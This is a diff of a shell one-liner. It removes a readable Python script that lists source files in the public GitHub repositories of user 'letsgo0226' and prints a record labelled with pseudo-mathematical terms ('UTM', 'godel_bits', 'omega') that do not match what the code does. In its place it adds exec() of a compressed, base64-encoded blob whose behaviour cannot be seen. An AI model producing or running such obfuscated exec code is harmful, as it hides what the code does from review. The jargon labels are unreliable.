@@ -1,12 +1,1 @@
-command -v python3>/dev/null||exit 127;python3 -c 'import sys,json as j,urllib.request as u,base64 as b;A="letsgo0226";H={"User-Agent":"PUBLIC-UTM"};G=lambda x:j.loads(u.urlopen(u.Request(x,headers=H)).read());R=[];p=1
-while 1:
- z=G("https://api.github.com/users/%s/repos?per_page=100&page=%d"%(A,p));R+=z
- if len(z)<100:break
- p+=1
-R=sorted(x for x in R if not x["private"] and not x["fork"] and x["name"]!="API",key=lambda x:x["name"]);F=[]
-for r in R:
- try:t=G("https://api.github.com/repos/%s/%s/git/trees/%s?recursive=1"%(A,r["name"],r["default_branch"]))["tree"]
- except:continue
- for x in t:
-  if x.get("type")=="blob" and x["path"].lower().endswith((".py",".sh",".c",".h",".cpp",".js",".ts",".java",".go",".rs",".rb",".pl",".lua",".hs",".ml")):F.append((r["name"],x["path"],x["sha"]))
-S=j.dumps(F,separators=(",",":"),ensure_ascii=False).encode();E=lambda x:int.from_bytes(b"\1"+x,"big");D=lambda n:n.to_bytes((n.bit_length()+7)//8,"big")[1:];g=E(S);print(j.dumps({"model":"ALL_PUBLIC_PROGRAMS_UTM","owner":A,"repos":len(R),"program_blobs":len(F),"state":"canonical(repo,path,blob_sha) corpus","godel_bits":g.bit_length(),"exact_manifest_roundtrip":D(g)==S,"utm":"U(<program,input>) simulates each computable program; manifest is its account corpus","snapshot":0,"programs_embedded":0,"network_required":1,"omega":"formal colim","omega_attained":0,"program_equals_zeta":0,"open":1,"final":0},separators=(",",":")))' "$@"
+command -v python3>/dev/null||exit 127;python3 -c 'import zlib,base64;exec(zlib.decompress(base64.b64decode("eNp9VG1r2zwU/e5foQk6JOo5yXjYhj0zspd0g46VdP3UFSPbN7ZSW9IkuXE69t+fKzdpGYyBub4+ejnn6F5Z9kZbT7ZOKyIc2caD7TpZJhZ+DuB8wIa4FA5e/RfyMlrmtAPvGj1/+fIVzT7nv+iVA/ti2YDyNKUXV+/Pv3x4cfX9K/2dneWd6MtakDHdJp0WtWNDggzagMJs/UDCxrgFUYN1+WfOkVrUjPNsnV/fZCZfRLtWdkAWaUTu8zNGW++NS2czYWTSSN8OZVLpfjagCjc7cTMLRrt3BmxhRAP5Yj5/PiUnNT1hy9iErU/z+4jIDelQxz1/i3PSEnlvI2JOkXGdOzwVqNlINtqSkUhF1mG+0p6M19RYeSc80BsiVH0EcebtAcEvJXocf5bT5cUXGt/C/ukoHkd5tkKPUaCwEwVa9Haf+n/YnNwFm/ggPPMWIHy8s1AN1sk7dDz5tEeWkNWwEUPni9IKVbXIzK9pWElvIgJjBcanlVZeqgGiJ8se9QTXY9KAZ9TvDVCe57TsdEmPRo3wuCFWdweW8QRU7XYolzGamD2NaeLaEKsQHjJjwmvrQvRT3Io7Ed6NDtFOmC1DNF2I3TANt9NA31HO01UiDHZRzdiT0Uc1IXOtCD6jy3yb1ENvHFvFDoywwmvsNIZbxdivPAblBguFcJWU+Up0DoKLStfAePbpqWxS+WRjdV+Uew+OlfTHgp6OMS1lQ3n28ThRpSrx+jCJqaSUvsA2a/BI+OlrPpu9OSy5XqQ3WZN/Ypc8w4ZSnh2F/qI9sneobnl+XjzcqOJi/e1svfx6WYSrFVO9U2Bpuozp1BE0Da285jH2pm6sQJVYpAO8QrgJOxYoBrHmD1ExhVFUvuiFkhu8joXVg6q9lYamH1mDBb+M6eB7lDMo7C/rRIfd4cEaCxiJRoxswFct1KTS1gyhTk4J41qN/4T5oyhXQF9CXUM9oQr8Di9NEX420gZwgcZ6aARyYRf2SFTpTvb0ABfCeyHVYfnRKa7GqhX34MWEh7/LtNVGKoGnOP/918Jz/j/7k5vj")))' "$@"
